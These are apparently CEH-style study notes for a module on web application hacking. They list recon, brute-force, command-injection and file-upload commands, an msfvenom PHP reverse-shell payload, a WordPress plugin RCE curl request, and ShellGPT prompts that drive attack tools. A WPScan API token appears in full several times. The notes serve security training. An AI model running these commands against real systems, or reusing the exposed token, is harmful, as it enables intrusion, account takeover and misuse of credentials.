# Module 14

## Hacking Web Applications
Web application hacking exploits vulnerabilities in apps via HTTP by manipulating logic, URIs, or HTTP elements. Common attacks include SQL Injection, XSS, CSRF, brute-force, and parameter tampering. Ethical hackers/pen testers test these flaws to secure applications.

**Objectives**
- Understand web application vulnerabilities.
- Learn common attack techniques (SQLi, XSS, CSRF, brute-force).
- Perform security assessments to identify and fix flaws.

**Approach**
- Analyze HTTP requests, URIs, and inputs.
- Simulate attacks using practical labs/tools.
- Identify weaknesses and recommend security measures.

---

### 1. Footprint the Web Infrastructure
Web infrastructure footprinting helps you to identify vulnerable web applications, understand how they connect with peers and the technologies they use, and find vulnerabilities.

#### 1.1 Web Applications recon using Nmap and telnet
- `sudo nmap -vv -A -T4 certifiedhacker.com`  //aggressive scan
- `telnet certifiedhacker.com 80`

#### 1.2 Web Applications recon using Whatweb
- `whatweb -v certifiedhacker.com  //verbose information`

#### 1.3 Web spidering using ZAP
Launch an automated scan and go to the spidering tab to view pages.    
<img width="644" height="462" alt="image" src="https://github.com/user-attachments/assets/273553ac-2ff4-4987-b47f-b190318b84c5" />

#### 1.4 Detect Load Balancers using various tools
- `dig` (you get multiple IPs)
- `lbd`

#### 1.5 Identify webserver directories
**Nmap**
- `nmap -sV --script http-enum certifiedhacker.com`
**gobuster**
- `gobuster dir -u certifiedhacker.com -w /usr/share/worlists/WORDLIST`
**dirsearch**
[dirsearch | Kali Linux Tools](https://www.kali.org/tools/dirsearch/)

#### 1.6 Vulnerability scanning using Vega
[Vega Vulnerability Scanner](https://subgraph.com/vega/)

#### 1.7 Identify Clickjacking using Clickjackpoc
Automated tool to find & created Exploit Poc for Clickjacking Vulnerability.
[GitHub - Raiders0786/ClickjackPoc](https://github.com/Raiders0786/ClickjackPoc)
- `python3 clickJackPoc.py -f domains.txt` \\save domain in a file

#### 1.8 Perform Web Application Vulnerability Scanning using SmartScanner
[Smart Web Vulnerability Scanner](https://www.thesmartscanner.com/)

---

### 2. Perform Web applications Attacks
An ethical hacker or pen tester must test their company’s web application against various attacks and other vulnerabilities.

#### 2.1 Brute force using Burp
**Steps**:    
- Set the burp proxy in browser, intercept the request, right click it and send it to intruder.
- Now clear the fields and set the targets
  - sniper if you are only brute forcing password.
  - cluster if bruteforcing both username and password
- set the payload, wordlists and launch attack. Different values of length will indicate the successful attempt.

**Other Bruteforcing tools**
[Brute Force Password Cracking with Medusa](https://shehackske.medium.com/brute-force-password-cracking-with-medusa-b680b4f33d69)
- `medusa -h 10.10.10.x -U /root/Documents/user_list.txt -p /root/Documents/pass_list.txt -M ftp -F`

**Hydra Brute force cheatsheat**    
- SSH
  - `hydra -l username -P passlist.txt 192.168.0.100 ssh  `

- FTP
  - `hydra -L userlist.txt -P passlist.txt ftp://192.168.0.100` 

- If the service isn't running on the default port, use -s
  - `hydra -L userlist.txt -P passlist.txt ftp://192.168.0.100 -s 221`
  
- TELNET
  - `hydra -l admin -P passlist.txt -o test.txt 192.168.0.7 telnet`

- Login form
  - `sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form "/department/login.php:username=admin&password=^PASS^:Invalid Password!"`
 
#### 2.2 Parameter tampering using Burp
In the proxy tab, go to the inspector session where value and name will be visible. You can change it and see the response.
<img width="652" height="421" alt="image" src="https://github.com/user-attachments/assets/a7146253-9062-42d2-b045-8ffa48270ce1" />

#### 2.3 Identify XSS using PwnXss
[GitHub - pwn0sec/PwnXSS: PwnXSS: Vulnerability (XSS) scanner exploit](https://github.com/pwn0sec/PwnXSS)
- `python3 pwnxss.py -u http://testphp.vulnweb.com`

#### 2.4 Exploit Parameter tempering with XSS
Exploiting parameter tampering with XSS involves modifying URL or form parameters to inject malicious scripts, which execute in the victim’s browser and compromise security.

#### 2.5 Perform CSRF attacks
**WPSCAN**
- `wpscan --api-token kAp93ZFanbv7N35slZDR6IHuWqiKpuws2aM3grEMsbY --url https://www.cavementech.com/ --plugins-detection aggressive --enumerate vp`
> Add --random-user-agent to avoid firewalls
- `wpscan --api-token kAp93ZFanbv7N35slZDR6IHuWqiKpuws2aM3grEMsbY --url https://www.cavementech.com/ --plugins-detection aggressive --enumerate vp --random-user-agent`

#### 2.6 Hack a wordpress site with WPSCAN and Metasploit
**Installation**
- `sudo apt update && sudo apt install wpscan`
- `wpscan --update`
- Enumerate wordpress users
  - `wpscan --api-token kAp93ZFanbv7N35slZDR6IHuWqiKpuws2aM3grEMsbY --url https://cavementech.com/ --enumerate u --random-user-agent`
- WPSCAN can be used to enumerate users, themes, plugins etc
  - `wpscan --url http://cmnatics.playground/ --enumerate u,p,t,vp --api-token kAp93ZFanbv7N35slZDR6IHuWqiKpuws2aM3grEMsbY`
<img width="724" height="205" alt="image" src="https://github.com/user-attachments/assets/d19a57cc-da78-466c-9e81-3f6f3aa1eaef" />
- Now launch the Metasploit with database
  - `service postgresql start`
  - `msconsole`
  - `use auxillary/scanner/wordpress_login_enum`
- Now set the options to brute force it
  - `set  PASS_FILE /usr/worlist.txt`
  - `set RHOSS 192.168.52.2`
  - `set RPORT 8080`
  - `set TARGETURI http://dddddd/login`
  - `set USERNAME admin`
  - `run`
- WPSCAN brute forcing
  - `wpscan –-url http://cmnatics.playground –-passwords rockyou.txt –-usernames cmnatic --api-token kAp93ZFanbv7N35slZDR6IHuWqiKpuws2aM3grEMsbY`
**Reference**
[TryHackMe | Cyber Security Training](https://tryhackme.com/room/webenumerationv2)

#### 2.7 Remote command execution to compromise a target server
**Setup and complete DVWA Guides**
[DVWA Walkthrough Step by Step - CavemenTech - Demystifying Technology](https://cavementech.com/2022/12/dvwa-walkthrough.html)
[DVWA Ultimate Guide - First Steps and Walkthrough - Bug Hacking](https://bughacking.com/dvwa-ultimate-guide-first-steps-and-walkthrough/)

**Windows Command  Injection**
- `hostname`
- `whoami`
- `tasklist`
- `Taskkill /PID 3112 /F` forcefully kills the processes
- `dir c:\`
- `net user`
- `net user test /add` add a new user
- `net localgroup Administrators test /add` add test user to administrators
- `net user test` to view the details of the user
- `dir C:\pin.txt /s`
- `type "C:\pin.txt"`

#### 2.8 Exploit File upload vulnerability
**Steps**:
- Generating the payload
  - `msfvenom -p php/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f raw >exploit.php`
- Run multi/handler to catch the shell
  - `use exploit/multi/handler`
  - `set payload php/meterpreter/reverse_tcp`
- Check the above DVWA walkthroughs. For high mode add the following on top of payload and save it as jpeg
  - `GIF98a;`
- Now in command prompt, rename the file
  - `copy C:\wamp64\www\DVWA\hackable\uploads\shell.jpeg C:\wamp64\www\DVWA\hackable\uploads\shell.php`
- open the shell, and you will get the meterpreter session.

#### 2.9 Exploit Log4j vulnerability
The Log4j vulnerability (Log4Shell) allows attackers to execute remote code by injecting malicious JNDI lookup strings into logs processed by vulnerable Log4j servers.

#### 2.10 Perform Remote Code Execution (RCE) Attack
We will exploit RCE in a plugin in wordpress.

**Steps**:
1. In the Terminal window, run `wpscan --url http://10.10.1.22:8080/CEH --api-token [API Token]` command.
2. The result appears, displaying detailed information regarding the target website.
3. Scroll down to the Plugin(s) Identified section, and observe the installed vulnerable plugins (wp-upg) on the target website.
4. In the Plugin(s) Identified section, within the context of the wp-upg plugin, an Unauthenticated Remote Code Execution (RCE) vulnerability has been detected as shown in the screenshot.
> The number of vulnerable plugins might differ when you perform this lab.
5. In this task, we will exploit the RCE vulnerability present in the wp-upg plugin.
6. To perform RCE attack, run `curl -i 'http://10.10.1.22:8080/CEH/wp-admin/admin-ajax.php?action=upg_datatable&field=field:exec:whoami:NULL:NULL'` command.
7. This curl command exploits a WordPress plugin vulnerability by sending a malicious request to the admin-ajax.php file, allowing an attacker to execute arbitrary system commands via the exec function, potentially leading to remote code execution.
8. In the last step, `whoami` command was executed, yielding the outcome nt authority\ \system

---

### 3. Detect Web Vulnerabilities using using web application security tools
The tasks in this lab will assist in discovering the underlying vulnerabilities and flaws in the target web application.

#### 3.1 Detect Web vulnerabilities using N-stalker
[N-Stalker](https://www.nstalker.com/)

#### 3.2 Detect Web Application Vulnerabilities using Wapiti Web Application Security Scanner
**Steps**:
1. In the terminal window run `cd wapiti` command to navigate into wapiti directory and run `python3 -m venv wapiti3` command to create virtual environment in python.
2. Now, run `. wapiti3/bin/activate` command to activate virtual environment.
3. Run `pip install .` command to install wapiti web application security scanner.
4. After installing the tool run `wapiti -u https://www.certifiedhacker.com` command to perform web application security scanning on certifiedhacker.com website.
> It takes approximately 10 minutes for the scan to complete.
5. Now, in the terminal run `cd /root/.wapiti/generated_report/` to navigate to generated_report directory.
6. Run `ls` command to view the contents of the directory. we can see that the certifiedhacker.com_xxxxxxxx_xxxx.html file is created.
> The name of the .html file varies when you perform this lab.
7. Run `cp certifiedhacker.com_xxxxxxxx_xxxx.html /home/attacker/` command to copy the .html file to /home/attacker location.
8. Open a new terminal and run `firefox certifiedhacker.com_xxxxxxxx_xxxx.html` command to open the .html file in Firefox browser.
9. Wapiti scan report opens upp in Firefox browser, you can analyze the scan result with the discovered vulnerabilities.
10. Scroll down to view the detailed information regarding each discovered vulnerability.

---

### 4. Perform Web Application Hacking using AI
Hacking web applications using AI involves leveraging advanced machine learning techniques to exploit vulnerabilities in web applications.

#### 4.1 Perform Web Application Hacking using ShellGPT
**Detect WAF**
- `sgpt --shell “Check if the target url www.certifiedhacker.com has web application firewall”`
- `sgpt --shell “Check if the target url https://www.certifiedhacker.com is protected with web application firewall using wafwoof”`
**Detect Load Balancer**
- `sgpt --shell "Use load balancing detector on target domain yahoo.com.”`
**Other prompts**    
- `sgpt --shell "Use Sn1per tool and scan the target url www.moviescope.com for web vulnerabilities and save result in file scan3.txt”`
- `sgpt --shell “Scan the web content of target url www.moviescope.com using Dirb”`
- `sgpt --shell “Scan the web content of target url www.moviescope.com using Gobuster"`
- `sgpt --shell “Scan the web content of target url www.moviescope.com using Gobuster" `
- `sgpt --shell "Attempt FTP login on target IP 10.10.1.11 with hydra using usernames and passwords file from /home/attacker/Wordlists"`
- `sgpt --chat wah --shell “create and run a custom script for web application footprinting and vulnerability scanning. The target url is www.certifiedhacker.com”`
- ` sgpt --chat wah --shell “create and run a custom python script for web application footprinting and vulnerability scanning. The target url is www.certifiedhacker.com”`
- `sgpt --chat wah --shell "create and run a custom python script which will run web application footprinting tasks to gather information and then use this information to perform vulnerability scanning on target url is www.certifiedhacker.com”`
- ` sgpt --shell “Fuzz the target url www.moviescope.com using Wfuzz tool”`

---
---
